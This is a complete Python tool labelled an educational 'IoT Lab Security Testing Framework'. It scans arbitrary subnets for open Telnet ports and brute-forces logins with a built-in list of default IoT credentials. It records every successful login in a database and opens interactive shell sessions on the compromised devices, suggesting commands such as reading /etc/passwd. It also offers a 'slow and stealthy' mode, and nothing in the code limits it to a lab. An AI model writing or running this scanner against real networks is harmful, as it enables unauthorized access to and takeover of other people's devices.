#!/usr/bin/env python3
"""
IoT Lab Security Testing Framework
Educational tool for testing IoT devices in isolated lab environments
"""

import socket
import telnetlib
import threading
import time
import json
import sqlite3
from datetime import datetime
import ipaddress
import argparse
from concurrent.futures import ThreadPoolExecutor

class IoTLabTester:
    def __init__(self, db_file="iot_lab_results.db", speed_mode="normal"):
        self.db_file = db_file
        self.speed_mode = speed_mode
        self.init_database()
        self.vulnerable_devices = []
        
        # Speed configuration
        self.speed_configs = {
            "slow": {
                "scan_threads": 10,
                "scan_timeout": 5,
                "login_timeout": 15,
                "delay_between_attempts": 2.0,
                "description": "Slow and stealthy (10 threads, 2s delay)"
            },
            "normal": {
                "scan_threads": 50,
                "scan_timeout": 3,
                "login_timeout": 10,
                "delay_between_attempts": 0.5,
                "description": "Balanced speed (50 threads, 0.5s delay)"
            },
            "fast": {
                "scan_threads": 100,
                "scan_timeout": 2,
                "login_timeout": 8,
                "delay_between_attempts": 0.1,
                "description": "Fast scanning (100 threads, 0.1s delay)"
            },
            "turbo": {
                "scan_threads": 200,
                "scan_timeout": 1,
                "login_timeout": 5,
                "delay_between_attempts": 0,
                "description": "Maximum speed (200 threads, no delay) - Use with caution!"
            }
        }
        
        self.config = self.speed_configs.get(speed_mode, self.speed_configs["normal"])
        print(f"[INFO] Speed mode: {speed_mode.upper()} - {self.config['description']}")
        
    def init_database(self):
        """Initialize SQLite database for storing results"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerable_devices (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT,
                username TEXT,
                password TEXT,
                device_banner TEXT,
                timestamp TEXT
            )
        ''')
        conn.commit()
        conn.close()
        
    def scan_telnet_port(self, ip, timeout=None):
        """Scan a single IP for open Telnet port (23)"""
        if timeout is None:
            timeout = self.config['scan_timeout']
            
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, 23))
            sock.close()
            return result == 0
        except:
            return False
            
    def scan_subnet(self, subnet):
        """Scan subnet for open Telnet ports"""
        print(f"[INFO] Scanning subnet {subnet} for open Telnet ports...")
        open_hosts = []
        
        try:
            network = ipaddress.IPv4Network(subnet, strict=False)
            
            with ThreadPoolExecutor(max_workers=self.config['scan_threads']) as executor:
                futures = {executor.submit(self.scan_telnet_port, str(ip)): str(ip) 
                          for ip in network.hosts()}
                
                for future in futures:
                    ip = futures[future]
                    try:
                        if future.result():
                            open_hosts.append(ip)
                            print(f"[+] Found open Telnet on {ip}")
                    except Exception as e:
                        continue
                        
        except Exception as e:
            print(f"[ERROR] Error scanning subnet: {e}")
            
        print(f"[INFO] Found {len(open_hosts)} hosts with open Telnet ports")
        return open_hosts
        
    def load_credentials(self, creds_file):
        """Load credentials from file"""
        credentials = []
        default_creds = [
            "admin:admin", "admin:password", "admin:12345", "admin:",
            "root:root", "root:admin", "root:password", "root:12345",
            "user:user", "guest:guest", "test:test", "admin:admin123",
            "administrator:administrator", "admin:1234", "root:toor",
            "support:support", "service:service", "operator:operator",
            "ipcamadmin:admin", "temphumidadmin:admin"
        ]
        
        try:
            with open(creds_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ':' in line:
                        credentials.append(line.split(':', 1))
        except FileNotFoundError:
            print(f"[INFO] Credentials file not found, using default credentials")
            
        # Add default credentials if file wasn't loaded
        if not credentials:
            for cred in default_creds:
                if ':' in cred:
                    credentials.append(cred.split(':', 1))
                    
        print(f"[INFO] Loaded {len(credentials)} credential pairs")
        return credentials
        
    def test_telnet_login(self, ip, username, password, timeout=None):
        """Test Telnet login with given credentials"""
        if timeout is None:
            timeout = self.config['login_timeout']
            
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=timeout)
            
            # Read initial banner
            banner = tn.read_until(b"login:", timeout=5).decode('ascii', errors='ignore')
            
            # Send username
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:", timeout=5)
            
            # Send password
            tn.write(password.encode('ascii') + b"\n")
            
            # Check for successful login
            response = tn.read_until(b"#", timeout=5).decode('ascii', errors='ignore')
            tn.close()
            
            if "#" in response or "$" in response:
                return True, banner.strip()
            else:
                return False, None
                
        except Exception as e:
            return False, None
            
    def brute_force_credentials(self, hosts, credentials):
        """Brute force credentials on discovered hosts"""
        print(f"[INFO] Testing credentials on {len(hosts)} hosts...")
        
        for host in hosts:
            print(f"[INFO] Testing {host}...")
            
            for username, password in credentials:
                success, banner = self.test_telnet_login(host, username, password)
                
                if success:
                    print(f"[+] SUCCESS: {host} - {username}:{password}")
                    print(f"[+] CREDENTIALS: {username}:{password}")
                    
                    # Store in database
                    self.store_vulnerable_device(host, username, password, banner)
                    break
                else:
                    if self.speed_mode != "turbo":  # Only show failures in non-turbo mode
                        print(f"[-] Failed: {host} - {username}:{password}")
                    
                # Apply speed-based delay
                if self.config['delay_between_attempts'] > 0:
                    time.sleep(self.config['delay_between_attempts'])
                
    def store_vulnerable_device(self, ip, username, password, banner):
        """Store vulnerable device in database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO vulnerable_devices 
            (ip_address, username, password, device_banner, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (ip, username, password, banner, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        self.vulnerable_devices.append({
            'ip': ip,
            'username': username,
            'password': password,
            'banner': banner
        })
        
    def print_credentials_only(self):
        """Print only the credentials in clean format"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('SELECT ip_address, username, password FROM vulnerable_devices')
        devices = cursor.fetchall()
        conn.close()
        
        if not devices:
            print("[INFO] No credentials found")
            return
            
        print("\n[+] DISCOVERED CREDENTIALS:")
        print("=" * 50)
        for device in devices:
            print(f"{device[0]} -> {device[1]}:{device[2]}")
        print("=" * 50)
        
    def list_vulnerable_devices(self):
        """List all vulnerable devices from database"""
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM vulnerable_devices')
        devices = cursor.fetchall()
        conn.close()
        
        if not devices:
            print("[INFO] No vulnerable devices found")
            return []
            
        print("\n[INFO] Vulnerable Devices:")
        print("-" * 80)
        for device in devices:
            print(f"IP: {device[1]}")
            print(f"Credentials: {device[2]}:{device[3]}")
            print(f"Banner: {device[4][:50]}...")
            print(f"Discovered: {device[5]}")
            print("-" * 80)
            
        return devices
        
    def interactive_session(self, ip, username, password):
        """Open interactive Telnet session"""
        print(f"[INFO] Opening session to {ip} with {username}:{password}")
        print("[INFO] Available commands:")
        print("  1. whoami")
        print("  2. uname -a")
        print("  3. ps aux")
        print("  4. netstat -an")
        print("  5. cat /etc/passwd")
        print("  6. exit")
        
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=10)
            
            # Login
            tn.read_until(b"login:")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:")
            tn.write(password.encode('ascii') + b"\n")
            tn.read_until(b"#")
            
            while True:
                command = input(f"{ip}# ").strip()
                
                if command.lower() == 'exit':
                    break
                    
                if command:
                    tn.write(command.encode('ascii') + b"\n")
                    response = tn.read_until(b"#", timeout=10)
                    print(response.decode('ascii', errors='ignore'))
                    
            tn.close()
            
        except Exception as e:
            print(f"[ERROR] Session error: {e}")

def main():
    parser = argparse.ArgumentParser(description='IoT Lab Security Testing Framework')
    parser.add_argument('--scan', help='Subnet to scan (e.g., 192.168.1.0/24)')
    parser.add_argument('--creds', help='Credentials file path', default='credentials.txt')
    parser.add_argument('--speed', choices=['slow', 'normal', 'fast', 'turbo'], 
                       default='normal', help='Scanning speed mode')
    parser.add_argument('--creds-only', action='store_true', help='Print only discovered credentials')
    parser.add_argument('--list', action='store_true', help='List vulnerable devices')
    parser.add_argument('--session', help='Open session to IP address')
    
    args = parser.parse_args()
    
    tester = IoTLabTester(speed_mode=args.speed)
    
    if args.scan:
        # Scan and brute force
        hosts = tester.scan_subnet(args.scan)
        if hosts:
            credentials = tester.load_credentials(args.creds)
            tester.brute_force_credentials(hosts, credentials)
            
    elif args.creds_only:
        # Print only credentials
        tester.print_credentials_only()
        
    elif args.list:
        # List vulnerable devices
        tester.list_vulnerable_devices()
        
    elif args.session:
        # Open interactive session
        devices = tester.list_vulnerable_devices()
        target_device = None
        
        for device in devices:
            if device[1] == args.session:  # IP match
                target_device = device
                break
                
        if target_device:
            tester.interactive_session(target_device[1], target_device[2], target_device[3])
        else:
            print(f"[ERROR] No credentials found for {args.session}")
            
    else:
        # Interactive mode
        print("IoT Lab Security Testing Framework")
        print("Speed Modes Available:")
        print("  slow   - Slow and stealthy (10 threads, 2s delay)")
        print("  normal - Balanced speed (50 threads, 0.5s delay)")
        print("  fast   - Fast scanning (100 threads, 0.1s delay)")
        print("  turbo  - Maximum speed (200 threads, no delay)")
        print()
        
        speed = input("Select speed mode (slow/normal/fast/turbo) [normal]: ").strip().lower()
        if speed not in ['slow', 'normal', 'fast', 'turbo']:
            speed = 'normal'
            
        tester = IoTLabTester(speed_mode=speed)
        
        print("1. Scan subnet")
        print("2. List vulnerable devices")
        print("3. Print credentials only") 
        print("4. Open session")
        
        choice = input("Select option: ")
        
        if choice == '1':
            subnet = input("Enter subnet (e.g., 192.168.1.0/24): ")
            hosts = tester.scan_subnet(subnet)
            if hosts:
                credentials = tester.load_credentials('credentials.txt')
                tester.brute_force_credentials(hosts, credentials)
                
        elif choice == '2':
            tester.list_vulnerable_devices()
            
        elif choice == '3':
            tester.print_credentials_only()
            
        elif choice == '4':
            devices = tester.list_vulnerable_devices()
            if devices:
                ip = input("Enter IP address: ")
                tester.interactive_session(ip, devices[0][2], devices[0][3])

if __name__ == "__main__":
    main()